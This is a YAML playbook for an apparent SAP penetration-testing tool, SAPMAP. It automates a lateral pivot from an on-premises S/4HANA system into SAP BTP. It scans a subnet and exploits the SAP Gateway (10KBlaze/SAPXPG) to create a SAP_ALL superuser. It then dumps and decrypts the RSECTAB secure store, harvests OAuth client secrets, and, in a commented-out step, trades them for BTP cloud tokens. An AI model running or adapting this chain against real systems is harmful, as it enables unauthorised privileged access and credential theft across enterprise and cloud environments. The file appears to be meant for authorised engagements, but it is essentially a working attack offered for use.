# SAPMAP playbook: on-prem → BTP lateral pivot
#
#   1. Discover S4H on the lab subnet
#   2. Check Gateway (10KBlaze / SAPXPG) vulnerability
#   3. Create a SAPMAP user with SAP_ALL via the GW exploit
#   4. Download the ABAP SecStore (RSECTAB) so OAuth client_secret
#      values become available
#   5. Harvest BTP credentials — refreshes OA2C_CLIENT[_EXT] and
#      scans every artefact source for BTP-shaped (client_id,
#      client_secret) tuples
#
# Usage:
#   python3 sapmap.py --script scripts/demo_onprem_to_btp.yaml --confirm
#
# `--confirm` is required because step 3 (`create_user`) is a
# destructive action that mints a real ABAP user on the target.
# The other steps are read-only and run dry without --confirm.
#
# After the playbook finishes, look at the harvest log for
# candidates and either:
#   * click Mint in the GUI (right-click the node → Exploitation
#     → Harvest BTP Credentials), or
#   * append a `mint_btp_token` step here with the chosen
#     candidate's uaa_url / client_id / client_secret to fully
#     automate the pivot.

name: "On-prem S/4 → BTP Lateral Pivot Demo"
description: >
  Discover S4H on 192.168.2.0/24, root via the gateway, dump the
  ABAP SecStore (RSECTAB), and harvest any BTP-bound OAuth client
  credentials sitting in OA2C_CONFIG / SM59 / SecStoreFS.  The
  output of the harvest step is the input to a separate
  `mint_btp_token` action that exchanges the secret at XSUAA for a
  BTP token and auto-enumerates the cloud topology.

steps:
  # 1. Discover S/4 on the lab subnet (S4H = 192.168.2.209).  Adjust
  #    the CIDR to your engagement scope.
  - action: scan
    targets: "192.168.2.0/24"
    mode: fast
    timeout: 600

  # 2. Check Gateway for SAPXPG / 10KBlaze (CVE-2020-6207 family).
  #    On a stock SAP gateway with `gw/reg_no_conn_info=0` this
  #    answers True without any creds.
  - action: check_gw
    target: S4H

  # 3. Mint a SAPMAP user with SAP_ALL via the GW exploit.  Lands
  #    in client 001 with the SAPMAP-default password (configurable
  #    in modules/core/sapmap_config.py).
  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"

  # 4. Download the ABAP SecStore (RSECTAB).  Decrypts
  #    /OA2C/CS_<UUID>_<NN> rows that hold OAuth client secrets;
  #    those rows feed into step 5's harvester via CLIENT_UUID.
  - action: download_secstore
    target: S4H

  # 5. Harvest BTP credentials.  Implicitly refreshes
  #    OA2C_CLIENT + OA2C_CLIENT_EXT (transaction OA2C_CONFIG)
  #    before scanning the four credential sources.  Look at the
  #    console output: any *.hana.ondemand.com endpoint with a
  #    matched secstore secret becomes a mintable candidate.
  - action: harvest_btp_creds
    target: S4H

  # ---------------------------------------------------------------
  # Optional follow-up — uncomment and fill in once you've reviewed
  # the harvest output and chosen a candidate to mint.  Use
  # `path:./loot/btp/secret.txt` to load the client_secret from a
  # file so the YAML stays clean of secrets.
  # ---------------------------------------------------------------
  # - action: mint_btp_token
  #   target: S4H
  #   uaa_url: "https://<subdomain>.authentication.<region>.hana.ondemand.com/oauth/token"
  #   client_id: "sb-clone…!b…|destination-xsappname!b…"
  #   client_secret: "path:./loot/btp/sapmap_dest_secret.txt"
